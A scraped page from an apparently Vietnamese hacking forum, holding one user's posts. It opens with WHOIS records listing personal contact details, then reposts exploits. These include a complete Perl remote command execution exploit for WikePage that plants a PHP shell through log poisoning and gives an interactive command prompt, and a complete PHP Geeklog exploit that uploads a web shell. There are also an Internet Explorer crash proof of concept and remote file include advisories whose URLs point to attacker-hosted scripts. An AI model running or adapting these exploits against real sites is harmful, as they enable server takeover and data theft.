+84-4-8226861<br/> country: VN<br/> changed: <a href="mailto:hm-changed@vnnic.net.vn">hm-changed@vnnic.net.vn</a> 20040527<br/> mnt-by: VNPT<br/> source: APNIC<br/><br/> person: Khanh Nguyen Hien<br/> nic-hdl: KNH1-AP<br/> e-mail: <a href="mailto:anhdzung@vdc.com.vn">anhdzung@vdc.com.vn</a><br/> address: Vietnam Datacommunications Company (VDC)<br/> address: 292 Tay Son street, Hanoi capital, Vietnam<br/> phone: +84-4-8212680<br/> fax-no: +84-4-9760397<br/> country: VN<br/> changed: <a href="mailto:hm-changed@vnnic.net.vn">hm-changed@vnnic.net.vn</a> 20051223<br/> mnt-by: VNPT<br/> source: APNIC<br/> &nbsp;
</blockquote><br/><br/> <font color='red'>THEGIOIDIDONG.COM</font><br/><br/> <blockquote>Domain Name: THEGIOIDIDONG.COM<br/> Registrar: ONLINENIC, INC.<br/> Whois Server: whois.OnlineNIC.com<br/> Referral URL:<span class="link"> http://www.OnlineNIC.com</span><br/> Name Server: NS1.DNS-DIY.COM<br/> Name Server: NS2.DNS-DIY.COM<br/> Status: REGISTRAR-LOCK<br/> Updated Date: 17-sep-2004<br/> Creation Date: 13-oct-2003<br/> Expiration Date: 13-oct-2007<br/> Registrant:<br/> AT AT <a href="mailto:info@advdomains.com">info@advdomains.com</a> +84.89305119<br/> THEGIOIMOBI.com<br/> 89 Nguyen Dinh Chieu St., Dist.3<br/> Ho Chi Minh,HCMC,VN 70000<br/><br/><br/> Domain Name:thegioididong.com<br/> Record last updated at 2005-01-07 03:42:50<br/> Record created on 2003/10/13<br/> Record expired on 2007/10/13<br/><br/><br/> Domain servers in listed order:<br/> ns1.dns-diy.com ns2.dns-diy.com<br/><br/> Administrator:<br/> Nguyen Duc Tai <a href="mailto:info@advdomains.com">info@advdomains.com</a> +84.89305119<br/> THEGIOIMOBI.com<br/> 89 Nguyen Dinh Chieu St., Dist.3<br/> Ho Chi Minh,HCMC,VN 70000<br/><br/> Technical Contactor:<br/> VN84.com * Domain & Hosting Registration <a href="mailto:support@vn84.com">support@vn84.com</a> +84.87155388<br/> ViSun Online Technology, Inc. | www.ViSunOnline.com<br/> Hall 3, Quang Trung Software Park, Dist.12<br/> Ho Chi Minh,HCMC,VN 70000<br/><br/> Billing Contactor:<br/> VN84.com * Domain & Hosting Registration <a href="mailto:billing@vn84.com">billing@vn84.com</a> +84.87155388<br/> ViSun Online Technology, Inc. | www.ViSunOnline.com<br/> Hall 3, Quang Trung Software Park, Dist.12<br/> Ho Chi Minh,HCMC,VN 70000<br/><br/><br/> Registration Service Provider:<br/> name: ViSun Online Technology, Inc.<br/> tel: +1.4156656387<br/> fax: +1.4156657168<br/> web:http://www.onlinenic.com<br/><br/> inetnum: 222.252.0.0 - 222.255.255.255<br/> netname: VNPT-VNNIC-VN<br/> descr: Vietnam Posts and Telecommunications Corp (VNPT)<br/> descr: 23 Phan Chu Trinh st., Hanoi capital, Vietnam<br/> country: VN<br/> admin-c: NXC1-AP<br/> tech-c: KNH1-AP<br/> remarks: for admin contact mail to Nguyen Xuan Cuong --&gt; NXC1-AP<br/> remarks: for Tech contact mail to Nguyen Hien Khanh --&gt; KNH1-AP<br/> mnt-by: MAINT-VN-VNNIC<br/> mnt-lower: MAINT-VN-VNPT<br/> status: ALLOCATED PORTABLE<br/> notify: <a href="mailto:hm-change@vnnic.net.vn">hm-change@vnnic.net.vn</a><br/> changed: <a href="mailto:hm-changed@apnic.net">hm-changed@apnic.net</a> 20040518<br/> changed: <a href="mailto:hm-changed@apnic.net">hm-changed@apnic.net</a> 20040518<br/> source: APNIC<br/><br/> person: Nguyen Xuan Cuong<br/> nic-hdl: NXC1-AP<br/> e-mail: <a href="mailto:cuong.ng@vnn.vn">cuong.ng@vnn.vn</a><br/> address: Vietnam Posts and Telecommunications (VNPT)<br/> address: 18 Nguyen Du street, Hanoi capital, Vietnam<br/> phone: +84-4-9430427<br/> fax-no: +84-4-8226861<br/> country: VN<br/> changed: <a href="mailto:hm-changed@vnnic.net.vn">hm-changed@vnnic.net.vn</a> 20040527<br/> mnt-by: VNPT<br/> source: APNIC<br/><br/> person: Khanh Nguyen Hien<br/> nic-hdl: KNH1-AP<br/> e-mail: <a href="mailto:anhdzung@vdc.com.vn">anhdzung@vdc.com.vn</a><br/> address: Vietnam Datacommunications Company (VDC)<br/> address: 292 Tay Son street, Hanoi capital, Vietnam<br/> phone: +84-4-8212680<br/> fax-no: +84-4-9760397<br/> country: VN<br/> changed: <a href="mailto:hm-changed@vnnic.net.vn">hm-changed@vnnic.net.vn</a> 20051223<br/> mnt-by: VNPT<br/> source: APNIC<br/> &nbsp;
</blockquote><br/><br/> Bạn nhìn thông tin trên có thể biết server phải ở vn ko,ai mua,ở đâu.........</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/27.html">Thông tin về các địa chỉ và tài liệu hữu ích</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/3151.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/3151/18183.html#18183,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">tài liệu có hình,... rất hay, cảm ơn anh Golden Autumn</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/13.html">Thông tin new bugs và exploits</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/3197.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/3197/18028.html#18028,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody"><span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>#!/usr/bin/perl
#
# WIKEPAGE &lt;= V2006.2a Opus 10 Remote Command Execution Exploit
# -------------------------------------------------------------
# IHST: h4ckerz.com / hackerz.ir
# AST : Aria-Security.Net
# Kapda : kapda.ir
#
#### &#40;c&#41;oded & discovered By Hessam-x &#40; Hessamx -at- Hessamx.net&#41;
use IO::Socket;
use LWP::Simple;
print "-------------------------------------------------------------\n";
print "= WIKEPAGE &lt;= V2006.2a Remote Command Execution Exploit =\n";
print "= By Hessam-x - www.Hessamx.net =\n";
print "-----------------------------------------------------------\n\n";
if &#40;@ARGV &lt; 2&#41;
{
print "&#91;*&#93; Usage: hxxpl.pl &#91;host&#93; &#91;path&#93;\n\n";
exit&#40;&#41;;
}
$server=$ARGV&#91;0&#93;;
$path=$ARGV&#91;1&#93;;
print " SERVER : $server \n";
print " Path : $path \n";
print "-------------------------------------------\n";
$pcode ="&lt;?php ob_clean&#40;&#41;;echo _Hessamx_;passthru&#40;\$_GET&#91;cmd&#93;&#41;;echo _xHessam_;die; ?&gt;";
$socket = IO::Socket::INET-&gt;new&#40;Proto=&gt;"tcp", PeerAddr=&gt;"$server", PeerPort=&gt;"http&#40;80&#41;"&#41; || die "&#91;-&#93; Cannot not connect to host !\n";
print $socket "GET ".$path.$pcode." HTTP/1.1\r\n";
print $socket "User-Agent: ".$pcode."\r\n";
print $socket "Host: ".$server."\r\n";
print $socket "Connection: close\r\n\r\n";
close&#40;$socket&#41;;
print "&#91;+&#93; PHP code injection in log file finished. \n";
$log = "no";
@apache=&#40;
"/var/log/httpd/access_log","/var/log/httpd/error_log",
"/var/log/apache/error.log","/var/log/apache/access.log",
"/apache/logs/error.log", "/apache/logs/access.log",
"/etc/httpd/logs/acces_log","/etc/httpd/logs/acces.log",
"/etc/httpd/logs/error_log","/etc/httpd/logs/error.log",
"/var/www/logs/access_log","/var/www/logs/access.log",
"/usr/local/apache/logs/access_log","/usr/local/apache/logs/access.log",
"/var/log/apache/access_log","/var/log/apache/access.log",
"/var/log/access_log","/var/www/logs/error_log",
"/www/logs/error.log","/usr/local/apache/logs/error_log",
"/usr/local/apache/logs/error.log","/var/log/apache/error_log",
"/var/log/apache/error.log","/var/log/access_log","/var/log/error_log",
&#41;;
for &#40;$i=0; $i&lt;=$#apache; $i++&#41;
{
print "&#91;+&#93; Apache Path : ".$i."\n";
$sock = IO::Socket::INET-&gt;new&#40;Proto=&gt;"tcp", PeerAddr=&gt;$server, Timeout =&gt; 10, PeerPort=&gt;"http&#40;80&#41;"&#41; || die "&#91;-&#93; cannot connect to host! \n";
print $sock "GET ".$path."index.php&cmd=id&lng=".$path&#91;$i&#93;."%00 HTTP/1.1\r\n";
print $sock "Host: ".$server."\r\n";
print $sock "Connection: close\r\n\r\n";
$out = "";
while &#40;$answer = &lt;$sock&gt;&#41;
{
$out.=$answer;
}
close&#40;$sock&#41;;
if &#40;$out =~ m/_Hessamx_&#40;.*?&#41;_xHessam_/ms&#41;
{
print "&#91;+&#93; Log File found ! &#91; $i &#93; \n\n";
$log = $i;
$i = $#path
}
}
if &#40;$log eq "no"&#41; {
print "&#91;-&#93; Can not found log file ! \n";
print "\n&#91;-&#93; Exploit Failed ! ... \n";
exit;
}
print "&#91;Hessam-x\@ $server&#93; \$ ";
$cmd = &lt;STDIN&gt;;
while&#40;$cmd !~ "exit"&#41;
{
$socket = IO::Socket::INET-&gt;new&#40;Proto=&gt;"tcp", PeerAddr=&gt;"$serv", PeerPort=&gt;"80"&#41; || die "&#91;-&#93; Cannot connect to host !\n";
print $socket "GET ".$path."index.php?cmd=".$cmd."&lng=../../../../../../../../..".$path&#91;$log&#93;."%00 HTTP/1.1\r\n";
print $socket "Host: ".$serv."\r\n";
print $socket "Accept: */*\r\n";
print $socket "Connection: close\r\n\n";
while &#40;$answer = &lt;$socket&gt;&#41;
{
print $answer;
}
print "&#91;Hessam-x\@ $server &#93; \$ ";
$cmd = &lt;STDIN&gt;;
}
# milw0rm.com &#91;2006-08-24&#93;</pre>
</div><br/> Nguồn<span class="link"> http://milw0rm.com/</span></span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/21.html">Thảo luận việc định hướng</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/3186.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/3186/18023.html#18023,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Tôi nghe nói VSEC dạy rất tốt(mặt dù chưa học,chỉ nghe nói ) <img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom"> ,VSEC là chử viết tắc của VietNam security network company,hình như nó ở trên đường 3/2 thì phải</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/31.html">Thảo luận mạng và thiết bị mạng</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/1509.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/1509/16082.html#16082,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">thanks doikengheo bài rất hay</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/13.html">Thông tin new bugs và exploits</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/725.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/725/2563.html#2563,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>#!/usr/bin/php -q -d short_open_tag=on
&lt;?
echo "Geeklog &lt;= 1.4.0sr3 'f&#40;u&#41;ckeditor' remote commands execution\n";
echo "by rgod &lt;a href="mailto:rgod@autistici.org"&gt;rgod@autistici.org&lt;/a&gt;\n";
echo "site:<span class="link"> http://retrogod.altervista.org\n</span>";
//works regardless of any php.ini settings,
//fckeditor &#40;very old 'mcpuk' version...&#41; is enabled by default,
//and connector.php not protected,
//you can upload multiple extensions files...
if &#40;$argc&lt;4&#41; {
echo "Usage: php ".$argv&#91;0&#93;." host path cmd OPTIONS\n";
echo "host: target server &#40;ip/hostname&#41;\n";
echo "path: path to geeklog\n";
echo "cmd: a shell command\n";
echo "Options:\n";
echo " -p&#91;port&#93;: specify a port other than 80\n";
echo " -P&#91;ip:port&#93;: specify a proxy\n";
echo "Example:\n";
echo "php ".$argv&#91;0&#93;." localhost / cat ./../../../../config.php\n";
die;
}
error_reporting&#40;0&#41;;
ini_set&#40;"max_execution_time",0&#41;;
ini_set&#40;"default_socket_timeout",5&#41;;
function quick_dump&#40;$string&#41;
{
$result='';$exa='';$cont=0;
for &#40;$i=0; $i&lt;=strlen&#40;$string&#41;-1; $i++&#41;
{
if &#40;&#40;ord&#40;$string&#91;$i&#93;&#41; &lt;= 32 &#41; | &#40;ord&#40;$string&#91;$i&#93;&#41; &gt; 126 &#41;&#41;
{$result.=" .";}
else
{$result.=" ".$string&#91;$i&#93;;}
if &#40;strlen&#40;dechex&#40;ord&#40;$string&#91;$i&#93;&#41;&#41;&#41;==2&#41;
{$exa.=" ".dechex&#40;ord&#40;$string&#91;$i&#93;&#41;&#41;;}
else
{$exa.=" 0".dechex&#40;ord&#40;$string&#91;$i&#93;&#41;&#41;;}
$cont++;if &#40;$cont==15&#41; {$cont=0; $result.="\r\n"; $exa.="\r\n";}
}
return $exa."\r\n".$result;
}
$proxy_regex = '&#40;\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b&#41;';
function sendpacketii&#40;$packet&#41;
{
global $proxy, $host, $port, $html, $proxy_regex;
if &#40;$proxy==''&#41; {
$ock=fsockopen&#40;gethostbyname&#40;$host&#41;,$port&#41;;
if &#40;!$ock&#41; {
echo 'No response from '.$host.':'.$port; die;
}
}
else {
$c = preg_match&#40;$proxy_regex,$proxy&#41;;
if &#40;!$c&#41; {
echo 'Not a valid proxy...';die;
}
$parts=explode&#40;':',$proxy&#41;;
echo "Connecting to ".$parts&#91;0&#93;.":".$parts&#91;1&#93;." proxy...\r\n";
$ock=fsockopen&#40;$parts&#91;0&#93;,$parts&#91;1&#93;&#41;;
if &#40;!$ock&#41; {
echo 'No response from proxy...';die;
}
}
fputs&#40;$ock,$packet&#41;;
if &#40;$proxy==''&#41; {
$html='';
while &#40;!feof&#40;$ock&#41;&#41; {
$html.=fgets&#40;$ock&#41;;
}
}
else {
$html='';
while &#40;&#40;!feof&#40;$ock&#41;&#41; or &#40;!eregi&#40;chr&#40;0x0d&#41;.chr&#40;0x0a&#41;.chr&#40;0x0d&#41;.chr&#40;0x0a&#41;,$html&#41;&#41;&#41; {
$html.=fread&#40;$ock,1&#41;;
}
}
fclose&#40;$ock&#41;;
#debug
#echo "\r\n".$html;
}
$host=$argv&#91;1&#93;;
$path=$argv&#91;2&#93;;
$port=80;
$proxy="";
$cmd="";
for &#40;$i=3; $i&lt;=$argc-1; $i++&#41;{
$temp=$argv&#91;$i&#93;&#91;0&#93;.$argv&#91;$i&#93;&#91;1&#93;;
if &#40;&#40;$temp&lt;&gt;"-p"&#41; and &#40;$temp&lt;&gt;"-P"&#41;&#41;
{$cmd.=" ".$argv&#91;$i&#93;;}
if &#40;$temp=="-p"&#41;
{
$port=str_replace&#40;"-p","",$argv&#91;$i&#93;&#41;;
}
if &#40;$temp=="-P"&#41;
{
$proxy=str_replace&#40;"-P","",$argv&#91;$i&#93;&#41;;
}
}
if &#40;&#40;$path&#91;0&#93;&lt;&gt;'/'&#41; or &#40;$path&#91;strlen&#40;$path&#41;-1&#93;&lt;&gt;'/'&#41;&#41; {echo 'Error... check the path!'; die;}
if &#40;$proxy==''&#41; {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
$shell="&lt;?php echo chr&#40;72&#41;.\"i Master!\";if&#40;get_magic_quotes_gpc&#40;&#41;&#41;{\$_COOKIE&#91;\"cmd\"&#93;=stripslashes&#40;\$_COOKIE&#91;\"cmd\"&#93;&#41;;}";
$shell.="ini_set&#40;\"max_execution_time\",0&#41;;error_reporting&#40;0&#41;;";
$shell.="echo \"*delim*\";passthru&#40;\$_COOKIE&#91;\"cmd\"&#93;&#41;;?&gt;";
$allowed_extensions = array&#40;"zip","doc","xls","pdf","rtf","csv","jpg","gif","jpeg","png","avi","mpg","mpeg","swf","fla"&#41;;
for &#40;$i=0; $i&lt;=count&#40;$allowed_extensions&#41;-1; $i++&#41;{
$filename="suntzu.php.".$allowed_extensions&#91;$i&#93;;
$data="-----------------------------7d529a1d23092a\r\n";
$data.="Content-Disposition: form-data; name=\"NewFile\"; filename=\"$filename\"\r\n";
$data.="Content-Type:\r\n\r\n";
$data.="$shell\r\n";
$data.="-----------------------------7d529a1d23092a--\r\n";
$packet="POST ".$p."fckeditor/editor/filemanager/browser/mcpuk/connectors/php/connector.php?Command=FileUpload&Type=File HTTP/1.0\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen&#40;$data&#41;."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii&#40;$packet&#41;;
sleep&#40;1&#41;;
$packet="GET ".$p."images/library/File/".$filename." HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: cmd=".$cmd."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii&#40;$packet&#41;;
if &#40;eregi&#40;"Hi Master!",$html&#41;&#41;{
echo"Exploit succeeded...!\n";
$temp=explode&#40;"*delim*",$html&#41;;
die&#40;$temp&#91;1&#93;&#41;;}
}
//if you are here...
echo "Exploit failed...";
?&gt;</pre>
</div></span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/13.html">Thông tin new bugs và exploits</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/720.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/720/2557.html#2557,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody"><span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>&lt;!--
/*
*
* Msie 7.0 Beta crash &#91;Proof of concept&#93;
* Bug discovered by Mr.Niega
*<span class="link"> http://www.swerat.com/</span>
*
* Affected Software: Internet Explorer 7.0 Beta
* Severity: Unknown
* Impact: Crash
* Solution Status: Unpatched
*
* E-Mail: MarjinZ@gmail.com & Mr.Niega@gmail.com
* __ __ __ __
*| \/ | __ _| \/ |
*| |\/| |/ _` | |\/| |
*| | | | | | | | | |
*|_| |_|_| |_|_| |_|
* Credits goes out to MarjinZ
*
*/
--&gt;
&lt;html&gt;
&lt;body&gt;
&lt;applet&gt;
&lt;applet&gt;
&lt;applet&gt;
&lt;applet&gt;
&lt;applet&gt;
&lt;applet&gt;
&lt;applet&gt;
&lt;applet&gt;
&lt;applet&gt;
&lt;applet&gt;
&lt;applet&gt;
&lt;applet&gt;
&lt;applet&gt;
&lt;applet&gt;
&lt;/body&gt;
&lt;/html&gt;</pre>
</div></span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/13.html">Thông tin new bugs và exploits</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/713.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/713/2554.html#2554,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">anh Bigball_hacker tích cực quá <img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom"> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/13.html">Thông tin new bugs và exploits</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/685.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/685/2395.html#2395,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody"><span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>---------------------------------------------------------------------------
Pearl For Mambo &lt;= 1.6 &#40;GlobalSettings&#91;templatesDirectory&#93;&#41; Remote File Include Vulnerabilities
---------------------------------------------------------------------------
Discovered By Kw3&#91;R&#93;Ln &#91; Romanian Security Team &#93; :<span class="link"> hTTp://RoSecurityGroup.net</span> :
Remote : Yes
Critical Level : Dangerous
---------------------------------------------------------------------------
Affected software description :
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Application : Pearl For Mambo
version : latest version &#91; 1.6 &#93;
Description: component for mambo
URL :<span class="link"> http://www.pearlinger.com</span>
------------------------------------------------------------------
Exploit:
~~~~~~~
Variable $GlobalSettings&#91;templatesDirectory&#93; not sanitized.When register_globals=on an attacker can exploit this vulnerability with a simple php injection script.
#<span class="link"> http://www.site.com/&#91;path&#93;/includes/functions_cms.php?phpbb_root_path=&#91;evil_script&#93;</span>
#<span class="link"> http://www.site.com/&#91;path&#93;/includes/adminSensored.php?GlobalSettings&#91;templatesDirectory&#93;=&#91;evil_script&#93;</span>
#<span class="link"> http://www.site.com/&#91;path&#93;/includes/adminBoards.php?GlobalSettings&#91;templatesDirectory&#93;=&#91;evil_script&#93;</span>
#<span class="link"> http://www.site.com/&#91;path&#93;/includes/adminAttachments.php?GlobalSettings&#91;templatesDirectory&#93;=&#91;evil_script&#93;</span>
#<span class="link"> http://www.site.com/&#91;path&#93;/includes/adminAvatars.php?GlobalSettings&#91;templatesDirectory&#93;=&#91;evil_script&#93;</span>
#<span class="link"> http://www.site.com/&#91;path&#93;/includes/adminBackupdatabase.php?GlobalSettings&#91;templatesDirectory&#93;=&#91;evil_script&#93;</span>
#<span class="link"> http://www.site.com/&#91;path&#93;/includes/adminBanned.php?GlobalSettings&#91;templatesDirectory&#93;=&#91;evil_script&#93;</span>
#<span class="link"> http://www.site.com/&#91;path&#93;/includes/adminForums.php?GlobalSettings&#91;templatesDirectory&#93;=&#91;evil_script&#93;</span>
#<span class="link"> http://www.site.com/&#91;path&#93;/includes/adminPolls.php?GlobalSettings&#91;templatesDirectory&#93;=&#91;evil_script&#93;</span>
#<span class="link"> http://www.site.com/&#91;path&#93;/includes/adminSmileys.php?GlobalSettings&#91;templatesDirectory&#93;=&#91;evil_script&#93;</span>
#<span class="link"> http://www.site.com/&#91;path&#93;/includes/poll.php?GlobalSettings&#91;templatesDirectory&#93;=&#91;evil_script&#93;</span>
#<span class="link"> http://www.site.com/&#91;path&#93;/includes/move.php?GlobalSettings&#91;templatesDirectory&#93;=&#91;evil_script&#93;</span>
---------------------------------------------------------------------------
Solution :
~~~~~~~~~
declare variabel $&#91;evil_script&#93;
---------------------------------------------------------------------------
Shoutz:
~~~~~
# Special greetz to my good friend &#91;Oo&#93;
# To all members of h4cky0u.org ;&#41; and Romanian Security Team &#91;<span class="link"> hTTp://RoSecurityGroup.net</span> &#93;
---------------------------------------------------------------------------</pre>
</div><br/><br/><br/><br/> Contact:<br/> ~~~~~~~<br/><br/> Nick: Kw3rLn<br/> E-mail: ciriboflacs[at]YaHoo[dot]Com<br/> Homepage:<span class="link"> hTTp://RoSecurityGroup.net</span><br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/13.html">Thông tin new bugs và exploits</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/683.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/683/2393.html#2393,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>RsGallery2 for Joomla
---------------------------------------------------------------------------
Discovered: marriottvn
Remote : Yes
Level : High
---------------------------------------------------------------------------
Affected software description :
Application : RsGallery2
version : latest version &#91; 1.11.2 &#93;
Description: component for joomla
URL:<span class="link"> http://rsdev.nl</span>
----------------------------------------------------------------------------
Vulnerable file :
rsgallery2.html.php
----------------------------------------------------------------------------
Exploit:
<span class="link"> http://&#91;sitepath&#93;/&#91;joomlapath&#93;/components/com_rsgallery2/rsgallery.html.php?mosConfig_absolute_path=http://&#91;attacker&#93;</span>
----------------------------------------------------------------------------
Fix:
1.Declare variabel $mosConfig_absolute_path
or
2.Add into the top function:
defined&#40; '_VALID_MOS' &#41; or die&#40; 'Direct Access to this location is not allowed.' &#41;;
----------------------------------------------------------------------------</pre>
</div><br/><br/> Contact:<br/><br/> Nick: marriottvn<br/> E-mail: i_love_lonely_girl[at]yahoo.com<br/> Web:<span class="link"> http://vnsecurity.com</span><br/><br/> Greetz to: VnRekcah<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/13.html">Thông tin new bugs và exploits</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/681.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/681/2391.html#2391,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody"><span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>---------------------------------------------------------------------------
GeekLog &lt;= 1.4.0 &#40;_CONF&#91;path&#93;&#41; Remote File Include Vulnerabilities
---------------------------------------------------------------------------
Google d0rk: "powered by geeklog"
